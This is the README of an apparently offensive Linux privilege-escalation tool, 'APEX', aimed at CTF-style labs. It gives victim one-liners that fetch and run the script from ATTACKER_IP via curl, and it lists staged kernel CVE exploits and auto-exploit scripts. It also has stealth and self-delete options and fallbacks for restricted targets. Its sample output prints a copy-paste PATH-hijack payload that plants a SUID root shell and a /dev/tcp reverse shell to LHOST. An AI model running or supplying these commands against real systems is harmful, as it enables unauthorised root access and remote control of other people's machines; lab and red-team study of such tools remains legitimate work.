# APEX — Adversarial Privilege Escalation eXaminer

**Linux privilege escalation tool. Finds root paths, not noise.**

APEX builds a complete graph of what runs as root and what you can influence.
The intersection is the exploit chain. It emits a ranked list of confirmed paths
with exact copy-paste commands — no yellow walls, no rabbit holes.

---

## Quick Start (from attacker Kali)

```bash
chmod +x apex.sh apex_serve.sh
./apex_serve.sh        # interactive: pick interface → starts HTTP server + CVE staging
```

Then on the victim:
```bash
bash <(curl -fsSL http://ATTACKER_IP:PORT/apex.sh)
bash <(curl -fsSL http://ATTACKER_IP:PORT/apex.sh) --stealth
bash <(curl -fsSL http://ATTACKER_IP:PORT/apex.sh) --full
```

Or run **locally only** (no HTTP server, no staging):
```bash
bash apex.sh
```

---

## What It Does

**11 adaptive layers** run in order, stopping early when confidence ≥ 90%:

| Layer | Name | What it finds |
|---|---|---|
| 1 | DAC Graph | SUID/SGID + GTFOBins payloads, sudo NOPASSWD + GTFO escapes, cron, writable scripts/dirs, group memberships |
| 2 | Deep Reader | strings analysis, PATH hijack in custom binaries, lib injection, indirect script→root-bin chains |
| 3 | Credentials | SSH keys (passphrase-free test, ready-paste ssh -i), credential files, history with passwords |
| 4 | Integrity | sudo rules, capabilities, apparmor gaps |
| 5 | Timeline | recently modified files, atime-hot cron targets |
| 6 | Dynamic | pspy background capture — catches minute-cron jobs |
| 7 | Kernel CVE | kernel version vs precise CVE ranges (CVE-2026-31431/43284, DirtyPipe, PwnKit, LooneyTunables, ...) |
| 8 | Container | docker/lxd/lxc escape, group→root, debugfs |
| 9 | MAC | AppArmor profile gaps, SELinux Enforcing-aware suggestions |
| 10 | Manual | contextual checklist (G1: debsums/aa-status/.my.cnf hints based on env), GTFOBins fallback loop (G2) |
| 11 | Final Watch | pspy-confirmed write-and-wait surfaces — exact backup + payload + restore commands |

Output: ranked `PATH 1/N` blocks with VECTOR, TARGET, VERIFY, EXPLOIT, and ALT EXPLOIT.

---

## Files

```
apex.sh                          Main tool (~8700 lines). Run standalone or via HTTP.
apex_serve.sh                    Kali-side launcher. Picks interface, precompiles CVE
                                 PoCs (gcc → cc → tcc fallback), stages enum tools,
                                 starts HTTP server, prints victim one-liners.

cve/
  CVE-2026-31431_copy_fail.c     Self-contained C source for copy_fail exploit.
                                 Auto-staged by apex_serve.sh — or compile manually
                                 and place in ~/.apex/cache/ to use offline.

CATALOGUE_COVERAGE.md            Detector coverage report (56/58 BankSmarter machines).
TEST_RESULTS.md                  Red-team validation log (chain verified, bugs fixed).
00-13_*.md                       Design documentation (architecture, vectors, traps).
LICENSE                          MIT + security-tool disclaimer.
```

---

## What Gets Staged and Served

When you run `./apex_serve.sh`, it:

1. Precompiles CVE PoCs as **static binaries** on Kali (no gcc/python needed on victim)
2. Downloads pspy, linpeas, les.sh, linenum, lse
3. Generates **pure-bash LPE scripts** for major vectors (no compiler required)
4. Starts an HTTP server
5. Prints victim one-liners immediately

**CVE PoCs staged:**

| CVE | Name | Success% | Type |
|---|---|---|---|
| CVE-2026-43284 | dirtyfrag | 99% | binary |
| CVE-2026-31431 | copy_fail | 95% | binary |
| CVE-2022-0847 | dirtypipe | 95% | binary |
| CVE-2021-4034 | pwnkit | 90% | binary |
| CVE-2023-2640 | gameover | 80% | bash |
| CVE-2023-0386 | overlayfs | 78% | binary |
| CVE-2023-32233 | nft | 75% | binary |
| CVE-2023-4911 | looney | 75% | binary |

**Bash LPE scripts (no compiler, work on `noexec /tmp` via `bash script.sh`):**

- `lpe_gameover.sh` — CVE-2023-2640/32629 Ubuntu OverlayFS
- `lpe_copy_fail.sh` — CVE-2026-31431 /etc/passwd UID-flip (python3 ≥ 3.13 or gcc)
- `lpe_dirtypipe_bash.sh` — CVE-2022-0847 bash+dd approach
- `lpe_suid_env.sh` — SUID PATH hijack automation
- `lpe_capabilities.sh` — cap_setuid/chown/dac_override auto-exploit
- `lpe_sudo_enum.sh` — sudo NOPASSWD auto-exploit
- `lpe_writable_service.sh` — systemd/cron hijack

---

## Validated Chain (BankSmarter Lab)

Target: Ubuntu 24.04 — kernel 6.14.0-1012-aws

```
layne.stanley → scott.weiland → ronnie.stone → root
```

| Step | Vector | Confidence | Exploit |
|---|---|---|---|
| layne → scott | PSPY_DIR_HIJACK (cron runs script in layne's 0777 home) | 95% | delete + recreate bankSmarter_backup.sh |
| scott → ronnie | UNIX_SOCK_LATERAL (live.sock, bank-team group) | 85% | socat stdio unix-connect:/opt/bank/sockets/live.sock |
| ronnie → root | CUSTOM_BIN_PATH_HIJACK (bank_backupd calls python3 without abs path) | 95% | PATH hijack via exec-safe dir |

APEX detected all three vectors with correct confidence and exact exploit commands.

---

## Exploit Output Format

```
┌─────────────────────────────────────────────────────────────────┐
│ [PATH 1/3]  CONFIDENCE: 95%  COMPLEXITY: MEDIUM  TIME: ~2min
├─────────────────────────────────────────────────────────────────┤
│ VECTOR:  CUSTOM_BIN_PATH_HIJACK
│ TARGET:  /usr/local/bin/bank_backupd
│ LENSES:  custom_bin
│ DESC:    Custom binary 'bank_backupd' calls 'python3' without
│          absolute path — PATH hijack via /dev/shm (runs as: root)
│
│ VERIFY FIRST:
│   ls -la /usr/local/bin/bank_backupd && strings /usr/local/bin/bank_backupd ...
│
└─────────────────────────────────────────────────────────────────┘
  ┌─ EXPLOIT (copy-paste as-is) ────────────────────────────────┐
  PATH=/dev/shm:$PATH; printf '#!/bin/bash -p\ncp /bin/bash /dev/shm/rootbash; chmod 4755 /dev/shm/rootbash\n' > /dev/shm/python3; chmod +x /dev/shm/python3; /usr/local/bin/bank_backupd; /dev/shm/rootbash -p
  └─────────────────────────────────────────────────────────────┘
  ┌─ ALT EXPLOIT ───────────────────────────────────────────────┐
  # reverse shell variant (set LHOST/LPORT)
  PATH=/dev/shm:$PATH; printf '#!/bin/bash\nbash -i >& /dev/tcp/LHOST/LPORT 0>&1\n' > /dev/shm/python3; chmod +x /dev/shm/python3; /usr/local/bin/bank_backupd
  └─────────────────────────────────────────────────────────────┘
```

---

## Key Design Decisions

- **No `/tmp` hardcoding** — APEX detects exec-safe dirs (`/dev/shm`, `/run/user/$UID`, `/tmp`, `/var/tmp`) and uses the first that works. Exploit templates use `${APEX_EXEC_DIR}` so they work on hardened `noexec /tmp` systems.
- **`chmod 4755` not `chmod +s`** — `+s` with root's umask `027` produces `6750` (rwsr-s---), not world-executable. `4755` sets rwxr-xr-x+SUID explicitly regardless of umask.
- **No fork-bomb risk** — all loops have depth limits and safe_run timeouts.
- **No network calls** — all detection is local file/proc reads.
- **Atomic findings** — each finding written via tmp+mv to prevent partial reads.
- **OPSEC** — findings dir in `/dev/shm/.apex_<rand>` (mode 700), cleanup trap on EXIT/INT/TERM.

---

## Running Locally (no HTTP server)

```bash
bash apex.sh                    # standard run
bash apex.sh --full             # all 11 layers, no early skip
bash apex.sh --stealth          # process masking + self-delete
bash apex.sh --test             # self-test mode
```

---

## Restricted Environments (always finds a way)

APEX is built to keep working when the victim is hostile:

| Restriction | APEX behavior |
|---|---|
| no `curl` | falls back to `wget` → `python3` → `python2` → `perl` → `php` → `ruby` → `busybox wget` → **pure-bash `/dev/tcp` HTTP/1.0 GET** |
| no `gcc` | tries `cc` → `tcc` for CVE PoC compile; emits NO-CC banner with apt/musl install hint |
| no `python3` | rewrites staged PoC to `python2`/`python` automatically; if neither, suggests the C variant of the same CVE |
| `noexec /tmp` | detects exec-safe dirs (`/dev/shm`, `/run/user/$UID`, `$HOME`, `/var/tmp`) and writes `${APEX_EXEC_DIR}` into every exploit template |
| restricted shell (rbash/lshell) | escape one-liners are printed in the manual layer (G2 fallback playbook) |
| no internet | `APEX_NO_DOWNLOAD=1` skips fetches; pre-stage `~/.apex/cache/` once and rerun offline |
| 8-color-only terminal | output uses 8-color ANSI + bold only — never 256-color or truecolor |
| no `id`/`whoami` | reads `/proc/self/status` for uid/gid |

Every exploit block also ships an **ALT EXPLOIT** variant — usually a reverse-shell version of the primary, in case the bind-shell is firewalled.

---

## Installing on a Fresh Kali

```bash
git clone https://github.com/<your-user>/TheRealAwesomeToolEverAndForEverForLinuxPrivEsc.git apex
cd apex
chmod +x apex.sh apex_serve.sh
# Run
./apex_serve.sh        # serve mode — HTTP + CVE staging + victim one-liners
# OR
bash apex.sh           # local-only run on this machine
```

Required: `bash >= 4`, `python3` (only for the HTTP server in serve mode).
Everything else is optional — APEX falls back through curl → wget → python → perl →
php → ruby → busybox → pure-bash `/dev/tcp` HTTP/1.0, and gcc → cc → tcc for compiling.

---

## Design Docs

The `00-13_*.md` files contain the complete adversarial design thinking:
architecture, every vector, every CTF trap, cross-platform compatibility,
detection engine internals, and honest gaps.
